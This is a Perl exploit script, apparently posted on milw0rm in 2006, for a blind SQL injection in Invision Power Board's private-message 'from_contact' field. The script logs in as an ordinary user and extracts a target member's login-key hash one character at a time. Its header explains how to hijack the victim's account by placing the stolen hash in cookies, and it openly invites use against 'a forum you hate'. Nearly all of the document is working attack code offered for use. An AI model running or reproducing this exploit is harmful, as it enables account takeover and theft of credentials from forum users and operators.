<html><head><title>Invision Power Board <= 2.1.5 (from_contact) SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#############################################################################
## IPB &lt;=2.1.4 exploit (possibly 2.1.5 too)                                ##
## Brought to you by the Ykstortion security team.                         ##
##                                                                         ##
## The bug is in the pm system so you must have a registered user.         ##
## The exploit will extract a password hash from the forum's data base of  ##
## the target user.                                                        ##
## You need to know the target user's member ID but it's not difficult to  ##
## find out, just look under their avatar next to one of their posts.      ##
## Once you have the hash, simply unset all forum cookies and set          ##
## member_id to the target user's member id and pass_hash to the hash      ##
## obtained from the database by this script.                              ##
##                                                                         ##
## Usage:                                                                  ##
##   $ ./ipb                                                               ##
##   IPB Forum URL ? forums.example.com/forums                             ##
##   Your username ? krypt_sk1dd13                                         ##
##   Your pass ? if_your_on_nix_this_gets_hidden                           ##
##   Target userid ? 3637                                                  ##
##                                                                         ##
##   Attempting to extract password hash from database...                  ##
##   537ab2d5b37ac3a3632f5d06e8e04368                                      ##
##   Hit enter to quit.                                                    ##
##                                                                         ##
## Requirements:                                                           ##
##   o Perl 5                                                              ##
##   o LWP 5.64 or later                                                   ##
##   o Internet access                                                     ##
##   o A forum you hate/dislike                                            ##
##   o A user on said forum                                                ##
##   o 32+ PMs left till your inbox is full, if not you can still delete   ##
##     PMs from your inbox as the successful ones come through             ##
##                                                                         ##
## Credit to: Nuticulus for finding the SQL injection                      ##
##                                                                         ##
## Have fun, you dumb skiddie.                                             ##
#############################################################################

use HTTP::Cookies;
use LWP 5.64;
use HTTP::Request;

# variables
my $login_page = '?act=Login&amp;CODE=01';
my $pm_page = '?act=Msg&amp;CODE=04';
my $pose_pm_page = '?';
my $tries = 5;
my $sql = '';
my $hash = '';
my $need_null = 0;
my $i;
my $j;
my @charset = ('0' .. '9', 'a' .. 'f');
my %form = (act		=&gt; 'Msg',
	CODE		=&gt; '04',
	MODE		=&gt; '01',
	OID		=&gt; '',
	removeattachid	=&gt; '',
	msg_title	=&gt; 'asdf',
	bbmode		=&gt; 'normal',
	ffont		=&gt; 0,
	fsize		=&gt; 0,
	fcolor		=&gt; 0,
	LIST		=&gt; ' LIST ',
	helpbox		=&gt; 'Insert Monotype Text (alt + p)',
	tagcount	=&gt; 0,
	Post		=&gt; 'jkl');
	

# objects
my $ua = LWP::UserAgent-&gt;new;
my $cj = HTTP::Cookies-&gt;new (file =&gt; &quot;N/A&quot;, autosave =&gt; 0);
my $resp;

# init the cookie jar
$ua-&gt;cookie_jar ($cj);

# allow redirects on post requests
push @{ $ua-&gt;requests_redirectable }, &quot;POST&quot;;

# get user input
print 'IPB Forum URL ? ';
chomp (my $base_url = &lt;STDIN&gt;);
print 'Your username ? ';
chomp (my $user = &lt;STDIN&gt;);
$form{entered_name} = $user;
print 'Your pass ? ';
# systems without stty will error otherwise
my $stty = -x '/bin/stty';
system 'stty -echo' if $stty;		# to turn off echoing
chomp (my $pass = &lt;STDIN&gt;);
system 'stty echo' if $stty;		# to turn it back on
print &quot;\n&quot; if $stty;
print 'Target userid ? ';	# it'll say next to one of their posts
chomp (my $tid = &lt;STDIN&gt;);

# parse the given base url
if ($base_url !~ m#^http://#) { $base_url = 'http://' . $base_url }
if ($base_url !~ m#/$|index\.php$#) { $base_url .= '/' }

do {
	$resp = $ua-&gt;post ($base_url . $login_page,
		[ UserName =&gt; $user,
		  PassWord =&gt; $pass,
		  CookieDate =&gt; 1,
		]);
} while ($tries-- &amp;&amp; !$resp-&gt;is_success());

# reset tries
$tries = 5;

# did we get 200 (OK) ?
if (!$resp-&gt;is_success()) { die 'Error: ' . $resp-&gt;status_line . &quot;\n&quot; }

# was the pass right ?
if ($resp-&gt;content =~ /sorry, the password was wrong/i) {
	die &quot;Error: password incorrect.\n&quot;;
}

# get ourselves a post_key (and an auth_key too with newer versions)
do {
	$resp = $ua-&gt;get ($base_url . $pm_page);
} while ($tries-- &amp;&amp; !$resp-&gt;is_success());

# reset tries
$tries = 5;

if (!$resp-&gt;is_success()) { die 'Error: ' . $resp-&gt;status_line . &quot;\n&quot; }
if ($resp-&gt;content =~ m#&lt;input\s+?type=[&quot;']?hidden[&quot;']?\s+?name=[&quot;']?post_key[&quot;']?\s+?value=[&quot;']?([0-9a-f]{32})[&quot;']?\s+?/&gt;#)
{
	$form{post_key} = $1;
} else {
	die &quot;Error: couldn't get a post key.\n&quot;;
}
if ($resp-&gt;content =~ m#&lt;input\s+?type=[&quot;']?hidden[&quot;']?\s+?name=[&quot;']?auth_key[&quot;']?\s+?value=[&quot;']?([0-9a-f]{32})[&quot;']?\s+/&gt;#)
{
	$form{auth_key} = $1;
}

# turn off buffering so chars in the hash show up straight away
$| = 1;

print &quot;\nAttempting to extract password hash from database...\n &quot;;

OFFSET:
for ($i = 0; $i &lt; 32; ++$i) {
	CHAR:
	for ($j = 0; $j &lt; @charset; ++$j) {
		# reset tries
		$tries = 5;
		print &quot;\x08&quot;, $charset[$j];
		# build sql injection
		$sql = '-1 UNION SELECT ' . ($need_null ? '0, ' : '') . 'CHAR('
		     . (join (',', map {ord} split ('', $user))) . ') FROM '
		     . 'ibf_members WHERE id = ' . $tid . ' AND MID('
		     . 'member_login_key, ' . ($i + 1) . ', 1) = CHAR('
		     . ord ($charset[$j]) . ')';
		$form{from_contact} = $sql;
		$resp = $ua-&gt;post ($base_url . $post_pm_page, \%form,
			referer =&gt; $base_url . $pm_page);
		if (!$resp-&gt;is_success()) {
			die &quot;\nError: &quot; . $resp-&gt;status_line
			  . &quot;\n&quot; if (!$tries);
			--$tries;
			redo;
		}
		if ($resp-&gt;content =~ /sql error/i) {
			if ($need_null) {
				die &quot;Error: SQL error.\n&quot;;
			} else {
				$need_null = 1;
				redo OFFSET;
			}
		} elsif ($resp-&gt;content !~ /there is no such member/i) {
			# we have a winner !
			print ' ';
			next OFFSET;
		}
	}
	# uh oh, something went wrong
	die &quot;\nError: couldn't get a char for offset $i\n&quot;;
}
print &quot;\x08 \x08\nHit enter to quit.\n&quot;;
&lt;STDIN&gt;;

# milw0rm.com [2006-05-01]</pre></html>